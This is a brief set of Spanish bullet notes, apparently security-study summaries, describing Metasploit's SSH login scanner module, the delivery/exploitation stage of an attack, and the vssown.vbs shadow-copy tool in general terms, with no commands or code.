- El código (auxiliary/scanner/ssh/ssh_login) es una herramienta dentro del marco de Metasploit que permite a los profesionales de seguridad realizar pruebas de autenticación en servidores SSH, ayudando a identificar y mitigar vulnerabilidades relacionadas con la seguridad.

- La etapa de Delivery / Exploitation es donde el atacante realmente pone en acción sus tácticas para comprometer un sistema, haciendo que su éxito o fracaso sea fundamental para el resultado del ataque.

- El comando vssown.vbs es una herramienta destinada a facilitar la manipulación de copias de sombra en Windows, permitiendo operaciones que podrían ser útiles tanto para pruebas de penetración como para actividades maliciosas. Este proceso permite a los testers de penetración recuperar información crítica de manera efectiva al aprovechar las copias de sombra en Windows.

